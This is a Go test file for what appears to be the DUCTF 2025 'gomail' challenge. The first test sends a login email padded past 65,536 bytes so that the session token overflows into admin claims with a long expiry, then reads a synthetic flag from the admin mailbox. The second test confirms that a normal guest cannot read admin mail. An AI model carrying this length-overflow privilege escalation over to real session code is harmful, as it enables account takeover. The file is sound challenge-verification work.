package main

// Integration regression for the unmodified DUCTF 2025 Go handlers.
// Synthetic local flag only; no network access or real credentials.
import (
    "bytes"
    "encoding/json"
    "net/http"
    "net/http/httptest"
    "strings"
    "testing"
    "time"

    "fat-monke/gomail/session"
    "github.com/gin-gonic/gin"
)

func TestPhase12OriginalGoSessionOverflow(t *testing.T) {
    gin.SetMode(gin.TestMode)
    const marker = "DUCTF{LOCAL_GOMAIL_SYNTHETIC_ONLY}"
    const target = "mc-fat@monke.zip"
    oldMessages := emails[target]
    emails[target] = []email{{From: "local", To: target, Subject: "Synthetic flag", Data: marker}}
    defer func() { emails[target] = oldMessages }()
    // Keep original HMAC signing and verification middleware unchanged.
    router := gin.New()
    router.Use(AttachSessionMiddleware())
    router.POST("/login", LoginHandler)
    router.GET("/emails", SessionMiddleware(), GetEmailsHandler)

    payload := target + strings.Repeat("z", 8) + "t" + strings.Repeat("A", (1<<16)-9)
    if len(payload) != (1<<16)+len(target) { t.Fatal("wrong email length") }
    requestData, err := json.Marshal(map[string]string{"email": payload, "password":"irrelevant"})
    if err != nil { t.Fatal(err) }
    loginRequest := httptest.NewRequest(http.MethodPost, "/login", bytes.NewReader(requestData))
    loginRequest.Header.Set("Content-Type", "application/json")
    recorder := httptest.NewRecorder()
    router.ServeHTTP(recorder, loginRequest)
    if recorder.Code != http.StatusOK {
        t.Fatalf("login route rejected overflow email %d: %s", recorder.Code, recorder.Body.String())
    }
    var response struct{ Token string `json:"token"` }
    if err := json.Unmarshal(recorder.Body.Bytes(), &response); err != nil { t.Fatal(err) }
    if response.Token == "" { t.Fatal("original HMAC-signed token missing") }
    // Query the actual decode implementation, NOT a reimplementation.
    var claims session.SessionClaims
    s := session.Session{Key: SessionKey}
    if err := s.Decode(response.Token, &claims); err != nil { t.Fatal(err) }
    if claims.Email != target || !claims.IsAdmin || claims.Expiry < time.Now().Unix()+86400 {
        t.Fatalf("original Go decoder did not elevate: %+v", claims)
    }
    emailRequest := httptest.NewRequest(http.MethodGet, "/emails", nil)
    emailRequest.Header.Set("X-Auth-Token", response.Token)
    emailResponse := httptest.NewRecorder()
    router.ServeHTTP(emailResponse, emailRequest)
    if emailResponse.Code != http.StatusOK || !strings.Contains(emailResponse.Body.String(), marker) {
        t.Fatalf("original emails handler did not disclose local marker: %d %s", emailResponse.Code, emailResponse.Body.String())
    }
}

func TestPhase12OrdinaryGuestCannotReadAdminMessages(t *testing.T) {
    gin.SetMode(gin.TestMode)
    router := gin.New()
    router.Use(AttachSessionMiddleware())
    router.POST("/login", LoginHandler)
    router.GET("/emails", SessionMiddleware(), GetEmailsHandler)
    payload, _ := json.Marshal(map[string]string{"email": "test@example.com", "password": "irrelevant"})
    l := httptest.NewRecorder()
    req := httptest.NewRequest(http.MethodPost, "/login", bytes.NewReader(payload))
    req.Header.Set("Content-Type", "application/json")
    router.ServeHTTP(l, req)
    if l.Code != http.StatusOK { t.Fatalf("guest login rejected: %s", l.Body.String()) }
    var token struct{ Token string `json:"token"` }
    if err := json.Unmarshal(l.Body.Bytes(), &token); err != nil { t.Fatal(err) }
    request := httptest.NewRequest(http.MethodGet, "/emails", nil)
    request.Header.Set("X-Auth-Token", token.Token)
    result := httptest.NewRecorder()
    router.ServeHTTP(result, request)
    if result.Code != http.StatusOK || strings.Contains(result.Body.String(), "Your New Challenge Flag") {
        t.Fatalf("guest unexpectedly accessed admin mailbox: %s", result.Body.String())
    }
}
